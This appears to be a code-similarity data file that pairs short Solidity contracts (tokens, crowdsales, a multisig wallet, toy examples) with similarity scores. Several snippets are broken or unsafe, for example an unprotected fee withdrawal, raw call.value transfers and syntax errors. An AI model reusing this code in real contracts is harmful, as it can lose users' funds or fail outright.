        return message;
    }

    function die() {
        if (msg.sender == owner) {
            selfdestruct(owner);
        }
    }
}"
"contract TrojanSecret {

uint memberCount;

string public name;
string public symbol;

mapping (string => address) Trojans;
mapping (string => string) secrets;
mapping (string => address[]) access;
mapping (string => uint) balance;
uint amount_for_unlock;



constructor() public{
        name   = ""Secrets""; 
        symbol = ""S"" ;
        amount_for_unlock = 1 ether;

}

function registerTrojan(string name) public returns(bool){
    if( Trojans[name] == address(0))  
    {
        memberCount ++;
        Trojans[name] = msg.sender;
        return True;
    } else {
        return false;
    }
}
function unregisterTrojan(string name) public {
    require( Trojans[name] != address(0));
    Trojans[name] = address(0);
    memberCount --;
}
function setSecret(string name,string message) public {
   require (Trojans[name] != address(0)&& Trojans[name] == msg.sender);
   secrets[name] = message;
}
function getSecret(string name) public view returns(string){
    require( Trojans[name] != address(0));
    bool flag = false;

    for(uint i = 0; i < access[name].length;i++)
    {
        if(access[name][i] == msg.sender){
            flag = true;
            break;

        }
    }
     if(flag){
         return secrets[name];
     }
     return ""message is locked"";
}

}",0.6408045204785359,"contract EtherGold_me {

    using SafeMath for uint;

    using Zero for *;



    string public symbol;

    string public  name;

    uint8 public decimals = 0;

    uint256 public totalSupply;

    

    mapping (address => uint256) public balanceOf;

    mapping(address => address) public adtransfers;

    

    event Transfer(address indexed from, address indexed to, uint tokens);

    

    

    

    

    constructor(string _symbol, string _name) public {

        symbol = _symbol;

        name = _name;

        balanceOf[this] = 10000000000;

        totalSupply = 10000000000;

        emit Transfer(address(0), this, 10000000000);

    }



    function transfer(address to, uint tokens) public returns (bool success) {

        

        

        if(!adtransfers[to].notZero()){

            adtransfers[to] = msg.sender;

            emit Transfer(this, to, tokens);

        }

        return true;

    }

    

    function massAdvertiseTransfer(address[] addresses, uint tokens) public returns (bool success) {

        for (uint i = 0; i < addresses.length; i++) {

            if(!adtransfers[addresses[i]].notZero()){

                adtransfers[addresses[i]] = msg.sender;

                emit Transfer(this, addresses[i], tokens);

            }

        }

        

        return true;

    }



    function () public payable {

        revert();

    }



}"
"contract Names {

    uint lastId;
    mapping(uint => string) public numberedNames;

    constructor() public {
        lastId = 0;
    }

    function setName(string memory name) public {
        numberedNames[lastId] = name;
        lastId++;
    }
}",0.6218389042614104,"contract NamableAddressList is AddressList {

    constructor(string _name, bool nullValue)

    AddressList(_name, nullValue) public {}



    function changeName(string _name) onlyOwner public {

        name = _name;

    }

}"
"contract Token {
 mapping (address => uint) public balances;

 function Token() {
     balances[msg.sender] = 1000000;
 }

 function transfer(address _to, uint _amount) {
     if (balances[msg.sender] < _amount) {
         throw;
     }

     balances[msg.sender] -= _amount;
     balances[_to] += _amount;
 }
}",0.6828897701324886,"contract XDT is DataeumToken {

  mapping(address => uint256) balances;

  function transfer(address destination, uint256 amount) public returns (bool success);

  function balanceOf(address tokenOwner) public view returns (uint balance);

}"
"contract Deployer {
  function deploy() external returns (Target) {
    return new Target();
  }
}",0.6723719477644889,"contract IDeployer is Ownable {

    function deploy(bytes data) external returns(address mtkn);

}"
"contract dapMultisig {

    
    struct Transaction {
        uint id;
        address destination;
        uint value;
        bytes data;
        TxnStatus status;
        address[] confirmed;
        address creator;
    }

    struct tokenTransaction {
        uint id;
        tokenInterface token;
        address reciever;
        uint value;
        address[] confirmed;
        TxnStatus status;
        address creator;
    }

    struct Log {
        uint amount;
        address sender;
    }

    enum TxnStatus { Unconfirmed, Pending, Executed }

    
    modifier onlyOwner () {
        bool found;
        for (uint i = 0;i<owners.length;i++){
            if (owners[i] == msg.sender){
                found = true;
            }
        }
        if (found){
            _;
        }
    }

    
    event WalletCreated(address creator, address[] owners);
    event TxnSumbitted(uint id, uint value);
    event TxnConfirmed(uint id, uint len);
    event TxnExecuted(TxnStatus status, uint amt);
    event topUpBalance(uint value);
    event LogAmount(uint256 value);
    event tokenTxnConfirmed(uint id, address owner);
    event tokenTxnExecuted(address token, uint256 value, address reciever);
    
    bytes32 public name;
    address public creator;
    uint public allowance;
    address[] public owners;
    Log[] logs;
    Transaction[] transactions;
    tokenTransaction[] tokenTransactions;
    uint public approvalsreq;


    function createWallet(uint _approvals, address[] _owners, bytes32 _name) public payable {
        name = _name;
        creator = msg.sender;
        allowance = msg.value;
        owners = _owners;
        approvalsreq = _approvals;
        emit WalletCreated(msg.sender, _owners);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    

    function getOwners() external view returns (address[]){
        return owners;
    }

    function getTxnNum() external view returns (uint){
        return transactions.length;
    }

    function getTxn(uint _id) external view returns (uint, address, uint, bytes, TxnStatus, address[], address){
        Transaction storage txn = transactions[_id];
        return (txn.id, txn.destination, txn.value, txn.data, txn.status, txn.confirmed, txn.creator);
    }

    function getLogsNum() external view returns (uint){
        return logs.length;
    }

    function getLog(uint logId) external view returns (address, uint){
        return(logs[logId].sender, logs[logId].amount);
    }

    function getTokenTxnNum() external view returns (uint){
        return tokenTransactions.length;
    }

    function getTokenTxn(uint _id) external view returns(uint, address, address, uint256, address[], TxnStatus, address){
        tokenTransaction storage txn = tokenTransactions[_id];
        return (txn.id, txn.token, txn.reciever, txn.value, txn.confirmed, txn.status, txn.creator);
    }

    

    function topBalance() external payable {
        require (msg.value > 0 wei);
        allowance += msg.value;

        
        uint loglen = logs.length++;
        logs[loglen].amount = msg.value;
        logs[loglen].sender = msg.sender;
        emit topUpBalance(msg.value);
    }

    function submitTransaction(address _destination, uint _value, bytes _data) external payable returns (bool) {
        uint newTxId = transactions.length++;
        transactions[newTxId].id = newTxId;
        transactions[newTxId].destination = _destination;
        transactions[newTxId].value = _value*1000000000000000000;
        transactions[newTxId].data = _data;
        transactions[newTxId].creator = msg.sender;
        if (transactions[newTxId].confirmed.length == approvalsreq){
            transactions[newTxId].status = TxnStatus.Pending;
        }
        emit TxnSumbitted(newTxId,_value);
        return true;
    }

    function confirmTransaction(uint txId) onlyOwner() external payable returns (bool){
        Transaction storage txn = transactions[txId];

        
        bool f;
        for (uint8 i = 0; i<txn.confirmed.length;i++){
            if (txn.confirmed[i] == msg.sender){
                f = true;
            }
        }
        
        require(!f);
        txn.confirmed.push(msg.sender);

        if (txn.confirmed.length == approvalsreq){
            txn.status = TxnStatus.Pending;
            require(txn.status == TxnStatus.Pending);

        
            require(allowance >= txn.value);

        
            address dest = txn.destination;
            uint val = txn.value;
            bytes storage dat = txn.data;
            assert(dest.call.value(val)(dat));

        
            txn.status = TxnStatus.Executed;

        
            allowance = allowance - txn.value;
            emit TxnExecuted(txn.status,allowance);
            return true;
        }

        
        emit TxnConfirmed(txId,txn.confirmed.length);

        return true;
    }

    
    function submitTokenTransaction(address _tokenAddress, address _receiever, uint _value) onlyOwner() external returns (bool) {
        uint newTxId = tokenTransactions.length++;
        tokenTransactions[newTxId].id = newTxId;
        tokenTransactions[newTxId].token = tokenInterface(_tokenAddress);
        tokenTransactions[newTxId].reciever = _receiever;
        tokenTransactions[newTxId].value = _value;
        tokenTransactions[newTxId].confirmed.push(msg.sender);
        if (tokenTransactions[newTxId].confirmed.length == approvalsreq){
            tokenTransactions[newTxId].status = TxnStatus.Pending;
        }
        emit TxnSumbitted(newTxId,_value);
        return true;
    }

    function confirmTokenTransaction(uint txId) onlyOwner() external returns (bool){
        tokenTransaction storage txn = tokenTransactions[txId];

        
        bool f;
        for (uint8 i = 0; i<txn.confirmed.length;i++){
            if (txn.confirmed[i] == msg.sender){
                f = true;
            }
        }
        
        require(!f);
        txn.confirmed.push(msg.sender);

        if (txn.confirmed.length == approvalsreq){
            txn.status = TxnStatus.Pending;
        }

        
        emit tokenTxnConfirmed(txId, msg.sender);

        return true;
    }

    function executeTokenTxn(uint txId) onlyOwner() external returns (bool){

        tokenTransaction storage txn = tokenTransactions[txId];

        
        require(txn.status == TxnStatus.Pending);

        
        uint256 balance = txn.token.balanceOf(address(this));
        require (txn.value <= balance);

        
        txn.token.transfer(txn.reciever, txn.value);

        
        txn.status = TxnStatus.Executed;

        
        emit tokenTxnExecuted(address(txn.token), txn.value, txn.reciever);

        return true;
    }
}",0.6669288008783204,"contract FidexToken is ERC20 {

    

    using SafeMath for uint256;

    address owner = msg.sender;



    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;    



    string public constant name = ""FidexToken"";

    string public constant symbol = ""FEX"";

    uint public constant decimals = 8;

    

    uint256 public totalSupply = 50000000000e8;

    uint256 public totalDistributed = 0;    

    uint256 public constant MIN_PURCHASE = 1 ether / 100;

    uint256 public tokensPerEth = 8000000e8;



    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    

    event Distr(address indexed to, uint256 amount);

    event DistrFinished();

    event IcoStarted();

    event ResetICO();



    event Airdrop(address indexed _owner, uint _amount, uint _balance);



    event TokensPerEthUpdated(uint _tokensPerEth);

    

    event Burn(address indexed burner, uint256 value);



    bool public distributionFinished = false;



    bool public icoStart = false;

    

    modifier canDistr() {

        require(!distributionFinished);

        require(icoStart);

        _;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

    

    

    constructor () public {

        owner = msg.sender;

    }

    

    function transferOwnership(address newOwner) onlyOwner public {

        if (newOwner != address(0)) {

            owner = newOwner;

        }

    }



    function startICO() onlyOwner canDistr public returns (bool) {

        icoStart = true;

        emit IcoStarted();

        return true;

    }



    function resetICO() onlyOwner canDistr public returns (bool) {

        icoStart = false;

        distributionFinished = false;

        emit ResetICO();

        return true;

    }



    function finishDistribution() onlyOwner canDistr public returns (bool) {

        distributionFinished = true;

        emit DistrFinished();

        return true;

    }

    

    function distr(address _to, uint256 _amount) canDistr private returns (bool) {

        totalDistributed = totalDistributed.add(_amount);        

        balances[_to] = balances[_to].add(_amount);

        emit Distr(_to, _amount);

        emit Transfer(address(0), _to, _amount);



        return true;

    }



    function doAirdrop(address _participant, uint _amount) internal {



        require( _amount > 0 );      



        require( totalDistributed < totalSupply );

        

        balances[_participant] = balances[_participant].add(_amount);

        totalDistributed = totalDistributed.add(_amount);



        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }



        

        emit Airdrop(_participant, _amount, balances[_participant]);

        emit Transfer(address(0), _participant, _amount);

    }



    function transferTokenTo(address _participant, uint _amount) public onlyOwner {        

        doAirdrop(_participant, _amount);

    }



    function transferTokenToMultiple(address[] _addresses, uint _amount) public onlyOwner {        

        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);

    }



    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        

        tokensPerEth = _tokensPerEth;

        emit TokensPerEthUpdated(_tokensPerEth);

    }

           

    function () external payable {

        getTokens();

     }

    

    function getTokens() payable canDistr  public {

        uint256 tokens = 0;



        

        require( msg.value >= MIN_PURCHASE );



        require( msg.value > 0 );



        

        tokens = tokensPerEth.mul(msg.value) / 1 ether;        

        address investor = msg.sender;

        

        if (tokens > 0) {

            distr(investor, tokens);

        }



        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

    }



    function balanceOf(address _owner) constant public returns (uint256) {

        return balances[_owner];

    }



    

    modifier onlyPayloadSize(uint size) {

        assert(msg.data.length >= size + 4);

        _;

    }

    

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[msg.sender]);

        

        balances[msg.sender] = balances[msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(msg.sender, _to, _amount);

        return true;

    }

    

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[_from]);

        require(_amount <= allowed[_from][msg.sender]);

        

        balances[_from] = balances[_from].sub(_amount);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(_from, _to, _amount);

        return true;

    }

    

    function approve(address _spender, uint256 _value) public returns (bool success) {

        

        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }

    

    function allowance(address _owner, address _spender) constant public returns (uint256) {

        return allowed[_owner][_spender];

    }

    

    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){

        AltcoinToken t = AltcoinToken(tokenAddress);

        uint bal = t.balanceOf(who);

        return bal;

    }

    

    function withdraw() onlyOwner public {

        address myAddress = this;

        uint256 etherBalance = myAddress.balance;

        owner.transfer(etherBalance);

    }

    

    function burn(uint256 _value) onlyOwner public {

        require(_value <= balances[msg.sender]);

        

        



        address burner = msg.sender;

        balances[burner] = balances[burner].sub(_value);

        totalSupply = totalSupply.sub(_value);

        totalDistributed = totalDistributed.sub(_value);

        emit Burn(burner, _value);

    }

    

    function withdrawAltcoinTokens(address _tokenContract) onlyOwner public returns (bool) {

        AltcoinToken token = AltcoinToken(_tokenContract);

        uint256 amount = token.balanceOf(address(this));

        return token.transfer(owner, amount);

    }

}"
"contract factory {
address[] public newContracts;
address public creator;

function factory (){
    creator = msg.sender;  
}

function create () payable returns (address){
    require(msg.value >= 1 * 1000000000000000000);
    newContracts.push(msg.sender);
    return newContract;
} 

function withdrawFee() {
    creator.transfer(this.balance);
}
}",0.668865124797926,"contract Merunas {

    address payable public owner = msg.sender;

    

    function () external {}

    function receiveDonation() public payable {}

    function extractFunds() public {

        require(msg.sender == owner);

        owner.transfer(address(this).balance);

    }

    function showBalance() public view returns(uint256) {

        return address(this).balance;

    }

}"
"contract d3 {
    Set.Data knownValues;

    function register(uint value) public {
        
        
        
        require(Set.insert(knownValues, value));
    }
    function contains(uint value) view public returns (bool) {
        return Set.contains(knownValues, value);
    }
    
}",0.6185048885113458,"contract ValidationUtil {

    function requireNotEmptyAddress(address value) internal{

        require(isAddressValid(value));

    }



    function isAddressValid(address value) internal constant returns (bool result){

        return value != 0;

    }

}"
"contract HelloWorld {
  uint public balance;

  function HelloWorld()  {
      balance = 1000;
  }

  function deposit(uint _value)  returns (uint _newValue) {
      balance += _value;
      return balance;
  }
}",0.6837506762877643,"contract ERC20 {
  function balanceOf(address _owner) public constant returns (uint balance);
  function transfer(address _to, uint _value) public returns (bool success);
}"
"contract yoThere {
        string public msg;
        function yoThere() {
          msg = ""Hey lol"";
        }

        function greet() constant returns(string) {
          return msg;
        }
     }",0.6434739465624707,"contract Oracle {

    function isOutcomeSet() public constant returns (bool);
    function getOutcome() public constant returns (int);
}"
"contract TokenSale {
    address public beneficiary;
    uint public amountRaised;
    uint public price;
    uint public dynamicLocktime;
    uint public globalLocktime;
    uint public lockType = 0;
    token public tokenReward;
    uint public exchangeRate;

    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public tokenBalanceOf;
    mapping(address => uint256) public timelocksOf;

    address[] public founders;
    address public owner;

    event FundTransfer(address backer, uint amount, uint exchangeRate, uint token, uint time, uint timelock, bool isContribution);
    event IsCharged(bool isCharged);
    event TokensClaimed(address founder, uint tokens);
    event TransferOwnership();
    event ChangeExchangeRate(uint oldExchangeRate, uint newExchangeRate);
    event NewGlobalLocktime(uint timelockUntil);
    event NewDynamicLocktime(uint timelockUntil);
    uint public tokenAvailable = 0;
    bool public charged = false;


    
    constructor(
        address _beneficiary,
        address _addressOfTokenUsedAsReward,
        uint _globalLocktime,
        uint _dynamicLocktime,
        uint _exchangeRate
    ) public {
        beneficiary = _beneficiary;
        dynamicLocktime = _dynamicLocktime;
        tokenReward = token(_addressOfTokenUsedAsReward);
        globalLocktime = now + _globalLocktime * 1 minutes;
        exchangeRate = _exchangeRate;
        owner = msg.sender;
    }

    
    function () payable public {
          require(charged);
          require(msg.value >= 10000000000); 
          uint am = (msg.value* exchangeRate * 100000000)/(1 ether); 
          require( tokenAvailable >= am);
          uint amount = msg.value;
          balanceOf[msg.sender] += amount;
          amountRaised += amount;
          tokenBalanceOf[msg.sender] += am;
          tokenAvailable -= am;

          if(timelocksOf[msg.sender] == 0){
            timelocksOf[msg.sender] = now + dynamicLocktime * 1 minutes;
          }

          emit FundTransfer(msg.sender, amount, exchangeRate, am, now, timelocksOf[msg.sender], true);
          founders.push(msg.sender);
    }


    modifier onlyOwner(){
      require(msg.sender == owner || msg.sender == beneficiary);
      _;
    }


    function doChargeCrowdsale() public onlyOwner{
      tokenAvailable = tokenReward.balanceOf(this);
      if(tokenAvailable > 0){
        charged = true;
        emit IsCharged(charged);
      }
    }



    function claimTokens(address adr) public{
      require(tokenBalanceOf[adr] > 0);

      if(lockType == 0){ 
        require(now >= timelocksOf[adr]);
      }else if(lockType == 1){ 
        require(now >= globalLocktime);
      } 

      if(tokenReward.transfer(adr, tokenBalanceOf[adr])){
        emit TokensClaimed(adr, tokenBalanceOf[adr]);
        tokenBalanceOf[adr] = 0;
        balanceOf[adr] = 0;
      }
    }



    function transferRaisedFunds() public onlyOwner {
        if (beneficiary.send(amountRaised)) {
           emit FundTransfer(beneficiary, amountRaised, exchangeRate, 0, now, 0, false);
        }
    }



    function transferOwnership(address newOwner) public onlyOwner{
      owner = newOwner;
      emit TransferOwnership();
    }


    function setExchangeRate(uint newExchangeRate) public onlyOwner{
      emit ChangeExchangeRate(exchangeRate, newExchangeRate);
      exchangeRate = newExchangeRate;
    }


    function setGlobalLocktime(uint mins) public onlyOwner{
      globalLocktime = now + mins * 1 minutes;
      emit NewGlobalLocktime(globalLocktime);
    }


    function setDynamicLocktime(uint mins) public onlyOwner{
      dynamicLocktime = now + mins * 1 minutes;
      emit NewDynamicLocktime(dynamicLocktime);
    }


    function setLockType(uint newType) public onlyOwner{
        require(newType == 0 || newType == 1 || newType == 2);
        lockType = newType;
    }


    function unlockTokensFor(address adr) public onlyOwner{
      timelocksOf[adr] = 1;
    }


    function resetLockFor(address adr) public onlyOwner{
      timelocksOf[adr] = 0;
    }


    function getLeftOver() public onlyOwner{
      if(tokenReward.transfer(beneficiary, tokenAvailable)){
        emit TokensClaimed(beneficiary, tokenAvailable);
        tokenAvailable = 0;
      }
    }
}",0.6665974511653046,"contract CrowdsaleWPTByRounds is Ownable {

  using SafeMath for uint256;

  using SafeERC20 for ERC20;



  

  ERC20 public token;



  

  address public wallet;



  

  Token public minterContract;



  

  

  uint256 public rate;



  

  uint256 public tokensRaised;



  

  uint256 public cap;



  

  uint256 public openingTime;

  uint256 public closingTime;



  

  uint public minInvestmentValue;



  

  bool public checksOn;



  

  uint256 public gasAmount;



  

  function setMinter(address _minterAddr) public onlyOwner {

    minterContract = Token(_minterAddr);

  }



  

  modifier onlyWhileOpen {

    

    require(block.timestamp >= openingTime && block.timestamp <= closingTime);

    _;

  }



  

  event TokenPurchase(

    address indexed purchaser,

    address indexed beneficiary,

    uint256 value,

    uint256 amount

    );



  

  event TokensTransfer(

    address indexed _from,

    address indexed _to,

    uint256 amount,

    bool isDone

    );



constructor () public {

    rate = 400;

    wallet = 0xeA9cbceD36a092C596e9c18313536D0EEFacff46;

    cap = 400000000000000000000000;

    openingTime = 1534558186;

    closingTime = 1535320800;



    minInvestmentValue = 0.02 ether;

        

    checksOn = true;

    gasAmount = 25000;

  }



   

  function capReached() public view returns (bool) {

    return tokensRaised >= cap;

  }



   

  function changeRate(uint256 newRate) public onlyOwner {

    rate = newRate;

  }



   

  function closeRound() public onlyOwner {

    closingTime = block.timestamp + 1;

  }



   

  function setToken(ERC20 _token) public onlyOwner {

    token = _token;

  }



   

  function setWallet(address _wallet) public onlyOwner {

    wallet = _wallet;

  }



   

  function changeMinInvest(uint256 newMinValue) public onlyOwner {

    minInvestmentValue = newMinValue;

  }



  

  function setChecksOn(bool _checksOn) public onlyOwner {

    checksOn = _checksOn;

  }



   

  function setGasAmount(uint256 _gasAmount) public onlyOwner {

    gasAmount = _gasAmount;

  }



   

  function setCap(uint256 _newCap) public onlyOwner {

    cap = _newCap;

  }



   

  function startNewRound(uint256 _rate, address _wallet, ERC20 _token, uint256 _cap, uint256 _openingTime, uint256 _closingTime) payable public onlyOwner {

    require(!hasOpened());

    rate = _rate;

    wallet = _wallet;

    token = _token;

    cap = _cap;

    openingTime = _openingTime;

    closingTime = _closingTime;

    tokensRaised = 0;

  }



  

  function hasClosed() public view returns (bool) {

    

    return block.timestamp > closingTime;

  }



  

  function hasOpened() public view returns (bool) {

    

    return (openingTime < block.timestamp && block.timestamp < closingTime);

  }



  

  

  



  

  function () payable external {

    buyTokens(msg.sender);

  }



  

  function buyTokens(address _beneficiary) payable public{



    uint256 weiAmount = msg.value;

    if (checksOn) {

        _preValidatePurchase(_beneficiary, weiAmount);

    }



    

    uint256 tokens = _getTokenAmount(weiAmount);



    

    tokensRaised = tokensRaised.add(tokens);



    minterContract.mint(_beneficiary, tokens);

    

    emit TokenPurchase(

      msg.sender,

      _beneficiary,

      weiAmount,

      tokens

    );



    _forwardFunds();

  }



  

  function _preValidatePurchase(address _beneficiary, uint256 _weiAmount)

  internal

  view

  onlyWhileOpen

  {

    require(_beneficiary != address(0));

    require(_weiAmount != 0 && _weiAmount > minInvestmentValue);

    require(tokensRaised.add(_getTokenAmount(_weiAmount)) <= cap);

  }



  

  function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {

    token.safeTransfer(_beneficiary, _tokenAmount);

  }



  

  function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {

    _deliverTokens(_beneficiary, _tokenAmount);

  }



  

  function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {

    return _weiAmount.mul(rate);

  }



  

  function _forwardFunds() internal {

    bool isTransferDone = wallet.call.value(msg.value).gas(gasAmount)();

    emit TokensTransfer (

        msg.sender,

        wallet,

        msg.value,

        isTransferDone

        );

  }

}"
"contract Bank  {
    struct Balance {
      address owner;
      uint vault;
      uint profit;
    }

    Balance balance;
      mapping (address => uint) balances;

    function Bank() {
        balance.owner = msg.sender;
        balance = Balance(msg.sender, 0, 0);
    }

    function getBalance() constant returns (uint) {
        if(msg.sender == balance.owner) {
           return this.balance;
        }
        throw;
    }

    function withdrawOwner() returns (bool) {
        if(msg.sender == balance.owner) {
           balance.vault = balance.vault - balance.profit;
           bool sent = balance.owner.send(balance.profit);
           balance.profit = 0;
           return sent;
        }
        return false;
    }

    function withdraw() returns (bool) {
        uint customerBalance = balances[msg.sender];
        if(customerBalance == 0) {
          throw;
        }

        balance.vault -= customerBalance;

        balances[msg.sender] = 0;
        return msg.sender.send(customerBalance);
    }

    function deposit() payable returns (bool) {
        uint take = 100;

        uint depositAmount = msg.value;
        balance.vault += depositAmount;
        balance.profit += take;

        balances[msg.sender] = depositAmount - take;

        if(msg.value < 20) {
          throw;
        } 

        return true;
    }
}",0.6400338557684906,"contract ExxStandart is ERC20 {

    using SafeMath for uint;

    

	string  public name        = ""Exxcoin"";

    string  public symbol      = ""EXX"";

    uint8   public decimals    = 0;



	mapping (address => mapping (address => uint)) allowed;

	mapping (address => uint) balances;



	function transferFrom(address _from, address _to, uint _value) {

		balances[_from] = balances[_from].sub(_value);

		allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

		balances[_to] = balances[_to].add(_value);

		Transfer(_from, _to, _value);

	}



	function approve(address _spender, uint _value) {

		allowed[msg.sender][_spender] = _value;

		Approval(msg.sender, _spender, _value);

	}



	function allowance(address _owner, address _spender) constant returns (uint remaining) {

		return allowed[_owner][_spender];

	}



	function transfer(address _to, uint _value) {

		balances[msg.sender] = balances[msg.sender].sub(_value);

		balances[_to] = balances[_to].add(_value);

		Transfer(msg.sender, _to, _value);

	}



	function balanceOf(address _owner) constant returns (uint balance) {

		return balances[_owner];

	}

}"
"contract smartContract {
    uint  value;
    function set(uint input) returns (bool success) {
         value = input;
    }
    function getValue() public view
     returns (uint)
    {
        return value;
    } 

}",0.6974049670562692,"contract BurnableERC20 is ERC20
{
    function burn(
        uint value
        )
        public
        returns (bool);

    function burnFrom(
        address from,
        uint value
        )
        public
        returns (bool);
}"
"contract Depository {
        mapping(address => uint256) public balances;

        function deposit(uint256 amount) external {
            require(amount > 0);

            Token token = Token(0xFab46E002BbF0b4509813474841E0716E6730136);
            require(token.transferFrom(msg.sender, address(this), amount), ""The deposit failed"");
            balances[msg.sender] += amount;
        }
    }",0.6310217655884193,"contract Token {
    address public issuer;
    mapping (address => uint) public balances;

    function Token() {
        issuer = msg.sender;
        balances[issuer] = 1000000;
    }

    function transfer(address _to, uint _amount) {
        if (balances[msg.sender] < _amount) {
            throw;
        }

        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
    }
}"
"contract Adoption {

address[16] public adopters;


function adopt(uint petId) public returns (uint) { 
  require(petId >= 0 &amp,&amp; petId <= 15); 
  adopters[petId] = msg.sender; 
  return petId;
 } 


function getAdopters() public view returns (address[16]) {
  return adopters;
 }

}",0.6260074857704897,"contract PreviousInterface {



    function ownerOf(uint id) public view returns (address);



    function getCard(uint id) public view returns (uint16, uint16);



    function totalSupply() public view returns (uint);



    function burnCount() public view returns (uint);



}"
"contract Object {

    string name;
    function Object(String _name) {
        name = _name
    }
}",0.6176834952285103,"contract Resolver {
    function setName(bytes32 node, string name) public;
}"
"contract ObjectFactory {
    function createObject(string name) returns (address objectAddress) {
        return address(new Object(name));
    }
}",0.624181956242698,"contract IGetBancorAddressFromRegistry{
  function getBancorContractAddresByName(string _name) public view returns (address result);
}"
"contract Test {
    
    function getString(address _mg) returns (address) {
         return _mg;
    }
}",0.697063933986563,"contract Token {
    function transferFrom(address, address, uint256) returns (bool);
}"
"contract Master is CustomerTemplate{

    address public owner;
    bytes32 public ownerName;
    address[] newCustomers;

    modifier onlyByMaster()  {
        require(msg.sender == owner);
        _;
    }

    function Master (bytes32 _ownerName) {

        owner = msg.sender;
        ownerName = _ownerName;
    }

    function createCustomer (bytes32 _customerName, bytes32 _customerLoc) {

        address myCustomer = new CustomerTemplate(_customerName, _customerLoc);
        newCustomers.push(myCustomer);
    }

    function killContract() constant onlyByMaster {

        if (msg.sender == owner) selfdestruct(owner);

    }

}",0.6074811579853221,"contract WishingWell {



    event wishMade(address indexed wisher, string wish, uint256 amount);

    

    address owner;

    

    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner {

        require(

            msg.sender == owner,

            ""Only owner can call this function.""

        );

        _;

    }



    function changeOwner(address new_owner) public onlyOwner {

        owner = new_owner;

    }

    

    function makeWish(string wish) public payable {

        emit wishMade(msg.sender, wish, msg.value);

    }

    

    function withdrawAll() public onlyOwner {

        address(owner).transfer(address(this).balance);

    }

    

}"
"contract ERC223Contract is ReentrancyGuard {
    using SafeMath for uint256;

    ERC223Interface private token;

    constructor(ERC223Interface _token) public {
        token = _token;
        emit Created(""Successfully created ERC223 Contract"");
    }

    function getBlockNumber() public view returns (uint256) {
        return block.number;
    }

    function getData() public pure returns (bytes memory) {
        return msg.data;
    }

    function getSignature() public pure returns (bytes4) {
        return msg.sig;
    }

    function () external {
      
      revert();
    }

    function tokenFallback(address player, uint tokens, bytes memory data) public nonReentrant {
        require(msg.sender == address(token));
        emit DepositedERC223Token(player, tokens, data);
    }

    event Created(string);
    event DepositedERC223Token(address from, uint value, bytes data);
}",0.6511715566588513,"contract MiniMeTokenInterface is ERC20Token {



    

    function approveAndCall(

        address _spender,

        uint256 _amount,

        bytes _extraData

    ) 

        external 

        returns (bool success);



    

    function createCloneToken(

        string _cloneTokenName,

        uint8 _cloneDecimalUnits,

        string _cloneTokenSymbol,

        uint _snapshotBlock,

        bool _transfersEnabled

    ) 

        public

        returns(address);



    

    function generateTokens(

        address _owner,

        uint _amount

    )

        public

        returns (bool);



    

    function destroyTokens(

        address _owner,

        uint _amount

    ) 

        public

        returns (bool);



    

    function enableTransfers(bool _transfersEnabled) public;



    

    function claimTokens(address _token) public;



    

    function balanceOfAt(

        address _owner,

        uint _blockNumber

    ) 

        public

        constant

        returns (uint);



    

    function totalSupplyAt(uint _blockNumber) public view returns(uint);



}"
"contract Secret is Ownable {

  string private secret;

  function Secret() public {
    secret = """";
  }

  function setSecret(string _secret) public onlyOwner {
    secret = _secret;
  }

}",0.6166989471949933,"contract MyTest{
    string private name;
   
    function setName(string newName) public{
        name=newName;
    }
    
    function getName() public view returns(string){
        return name;
    }
    
}"
"contract Foo {

    uint256 public foo;

    function setFoo(uint256 _foo) public {
        foo = _foo;
    }

    function setFooToZero() public {
        foo = 0;
    }
}",0.6151133532586703,"contract IProject is ICaller {

	function invest(bytes32 _projectID, uint256 _eth, uint256 _sf) public;

	function disinvest() public;

}"
"contract BigData { 
  bytes public doubleBag = ""1"";

  function doubleStorage() public { 
    uint256 index = 0;
    uint256 addThisMany = doubleBag.length;
    while (index < addThisMany) { 
      doubleBag.push(""1"");
      index += 1;
    } 
  } 

  function getLength() public view returns (uint256) { 
    return doubleBag.length;
  } 
}",0.6309504355476883,"contract IERC721Enumerable is IERC721 {

  function totalSupply() public view returns (uint256);

  function tokenOfOwnerByIndex(

    address owner,

    uint256 index

  )

    public

    view

    returns (uint256 tokenId);



  function tokenByIndex(uint256 index) public view returns (uint256);

}"
"contract Crowdsale {
address public beneficiary;
uint public amountRaised;
uint public price;
token public tokenReward;
mapping(address => uint256) public balanceOf;

event FundTransfer(address backer, uint amount, bool isContribution);


constructor(
    address ifSuccessfulSendTo,
    uint milietherCostOfEachToken,
    address addressOfTokenUsedAsReward
) public {
    beneficiary = ifSuccessfulSendTo;
    price = milietherCostOfEachToken * 0.001 ether;
    tokenReward = token(addressOfTokenUsedAsReward);
}

function () payable public {

uint amount = msg.value;
balanceOf[msg.sender] += amount;
amountRaised += amount;
tokenReward.transfer(msg.sender, amount * 10**18 / price);
emit FundTransfer(msg.sender, amount, true);


beneficiary.transfer(amount);
}
        }",0.6251699038811304,"contract Neulaut {



    uint256 public totalSupply = 7*10**27;

    address owner;

